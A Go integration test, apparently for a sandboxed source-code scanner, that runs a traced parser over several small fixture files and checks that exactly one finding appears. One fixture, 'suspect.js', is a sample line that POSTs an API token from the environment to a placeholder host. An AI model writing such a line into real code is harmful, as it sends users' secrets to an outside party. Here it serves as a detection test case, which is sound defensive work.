//go:build linux && realcorpus

package sandbox

import (
	"context"
	"encoding/json"
	"os"
	"testing"
	"time"

	"github.com/rahoney/heliopause/internal/core/domain"
	"github.com/rahoney/heliopause/internal/core/ports"
	"github.com/rahoney/heliopause/internal/hosttool"
	"github.com/rahoney/heliopause/internal/runtimeidentity"
)

// This is the fixed source parser's runtime qualification, not an artifact
// safety verdict or the Inspection/Policy consumer acceptance.
func TestSourceAnalysisActualTracedParser(t *testing.T) {
	if os.Getenv("HELOX_SOURCE_ANALYSIS_INTEGRATION") != "1" {
		t.Skip("requires explicit fixed supply and isolated current observer runtime")
	}
	supervisor := integrationObserverSupervisor(t)
	defer func() {
		if err := supervisor.Close(); err != nil {
			t.Error(err)
		}
	}()
	ctx, cancel := context.WithTimeout(context.Background(), 2*time.Minute)
	defer cancel()
	executor, err := hosttool.NewSystem(ctx)
	if err != nil {
		t.Fatal(err)
	}
	defer func() {
		if err := executor.Close(); err != nil {
			t.Error(err)
		}
	}()
	resources := &pipxActualResources{ObservationResourceClient: integrationObservationResourceAdapter(t)}
	analyzer, err := NewSourceAnalyzer(executor, supervisor.Observer(), resources)
	if err != nil {
		t.Fatal(err)
	}
	input := sourceAnalysisInputFixture(t)
	input.Files = []ports.SourceAnalysisFile{
		{Path: "plain.js", Language: "javascript", Body: []byte("const answer = 42;\n")},
		{Path: "plain.ts", Language: "typescript", Body: []byte("const answer: number = 42;\n")},
		{Path: "plain.py", Language: "python", Body: []byte("answer = 42\n")},
		{Path: "plain.go", Language: "go", Body: []byte("package plain\nconst Answer = 42\n")},
		{Path: "plain.rs", Language: "rust", Body: []byte("pub const ANSWER: i32 = 42;\n")},
		{Path: "plain.tf", Language: "hcl", Body: []byte("locals { answer = 42 }\n")},
		{Path: "suspect.js", Language: "javascript", Body: []byte("fetch('https://example.invalid', {method: 'POST', body: process.env.API_TOKEN});\n")},
	}
	result, runErr := analyzer.Analyze(ctx, input)
	t.Logf("profile=%s status=%s observer_reason=%s error=%v", sourceAnalysisProfile, result.Runtime.Status(), integrationObserverFaultReason(supervisor), runErr)
	if runErr != nil || result.Runtime.Status() != domain.SandboxCompleted || result.Output == nil {
		t.Fatal("traced source parser did not complete")
	}
	var output struct {
		Version string            `json:"version"`
		Results []json.RawMessage `json:"results"`
		Errors  []json.RawMessage `json:"errors"`
		Paths   struct {
			Scanned []string `json:"scanned"`
		} `json:"paths"`
		Skipped []json.RawMessage `json:"skipped_rules"`
	}
	if err := json.Unmarshal(result.Output.Stdout(), &output); err != nil {
		t.Fatal(err)
	}
	if output.Version != runtimeidentity.SelectedSemgrepSupply().Version || len(output.Paths.Scanned) != len(input.Files) || len(output.Results) != 1 || len(output.Errors) != 0 || len(output.Skipped) != 0 {
		t.Fatalf("unexpected fixed parser coverage: version=%s scanned=%d findings=%d errors=%d skipped=%d", output.Version, len(output.Paths.Scanned), len(output.Results), len(output.Errors), len(output.Skipped))
	}
	resources.mu.Lock()
	creates, registers, closes, cpu := resources.creates, resources.registers, resources.closes, resources.cpu
	resources.mu.Unlock()
	if creates != 1 || registers != 1 || closes != 1 || cpu == 0 {
		t.Fatal("resource lifetime was not closed exactly once")
	}
	t.Logf("source_analysis_complete scanned=%d findings=%d errors=0 skipped=0 creates=%d registers=%d closes=%d cpu_usec=%d", len(output.Paths.Scanned), len(output.Results), creates, registers, closes, cpu)
}
